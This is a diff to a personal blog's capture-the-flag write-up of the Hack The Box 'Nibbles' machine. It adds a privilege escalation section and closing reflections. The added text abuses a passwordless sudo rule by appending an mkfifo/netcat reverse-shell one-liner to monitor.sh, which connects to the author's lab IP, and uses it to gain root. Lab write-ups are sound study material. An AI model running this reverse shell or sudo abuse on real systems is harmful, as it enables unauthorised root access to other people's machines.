@@ -61,7 +61,7 @@ I tried using *whatweb* but it didn't really dispaly any information that I hadn
 ---
 
 
-<ins> *Directory Scanning** </ins>
+<ins> **Directory Scanning** </ins>
 
 My go to directory scanning tool lately has been *gobuster*. Using it on the *target_IP* yielded a few results with *403* status codes. Taking it a step deeper and scanning the */nibbleblog/* directory itself gave a few more useful results. Particularly the ones that returned a *200* status code *admin.php*, *README*, and *index.php* directories.
 
@@ -99,7 +99,7 @@ The only other file in this directory that leads to anything human readable is t
 ---
 
 
-<ins> *Gaining a Foothold* </ins>
+<ins> **Gaining a Foothold** </ins>
 
 Having a username but no password doesn't quite give me everything that I need to login to that *admin.php* page, and since there is a timeout in the number of attempts I still can't *bruteforce* it. So I decided to use *cEWL* to generate a small dictionary. [cEWL](https://github.com/digininja/CeWL) is a ruby app which spiders a given URL, up to a specified depth, and returns a list of words.
 
@@ -168,6 +168,45 @@ Navigating to the */home/nibbler/* Directory I'm able to see two files *personal
 
 
 <ins> **Privilege Escalation** </ins>
+
+I originally forgot to give myself an upgraded *TTY* and when I tried to continue along with the challenge it caused an issue for me. So I back out and reran the exploit. This time after entering the `shell` command in the *meterpreter* I entered teh following python script `python3 -c 'import pty; pty.spawn("/bin/bash")' ` which gave me a much friendly looking environment to work in. 
+
+![Upgrade TTY](/docs/assets/images/HTB/nibbles/nibbles29.png)
+
+I used `sudo -l` to check for any sudo privileges on the *nibbler* account and it appears this user is able to execute a shell script for a specific directory as the *root* user withouth a password.
+
+> (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+
+![sudo -l](/docs/assets/images/HTB/nibbles/nibbles30.png)
+
+There was a *zip* file in the *nibbler* users directory called *personal* navigating over to and then unzipping it inflates the entire filepath to the shell script *nibbler* can run as *root*.
+
+![unzip personal](/docs/assets/images/HTB/nibbles/nibbles31.png)
+
+Given that I have full control over this file I should be able to append a command at the end of it that is executed with nibblers sudo privileges. If I use a script to send myself a reverse shell I can catch it on a *netcat listener* on my host machine and have root access. Running the following command in the directory containing the *monitor.sh* script will do it.
+
+`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.224 4646 >/tmp/f" >> monitor.sh `
+
+Then I just set up a listener in a new terminal using `nc -lvnp 4646` once I see the connection come through on the listener I can run `whoami` to verify I have root access.
+
+![append reverse shell](/docs/assets/images/HTB/nibbles/nibbles32.png)
+
+![Listener Connection](/docs/assets/images/HTB/nibbles/nibbles33.png)
+
+From here it was just navigating to the */root/* directory and using `cat` to read the file with the flag
+
+![Root Flag](/docs/assets/images/HTB/nibbles/nibbles34.png)
+
+That's it for Nibbles for now.
+
+![pwned]()
+
+---
+
+
+<ins> **Final Thoughts** </ins>
+
+I learned a good bit from this machine in regards to enumeration techniques and got some experience using cEWL for the first time. I need to look more into TTY and what it means to upgrade to an improved one, even with the python script I ran to obtain a better one it was still shaky at best and at times difficult to correct any small mistakes without starting over entirely. Like all machines this one is solvable in a way that manually exploits the vulnerability. I intend to come back to this post one day and update it with a section dedicated to that, but for now that's all I got. 
 
 
 
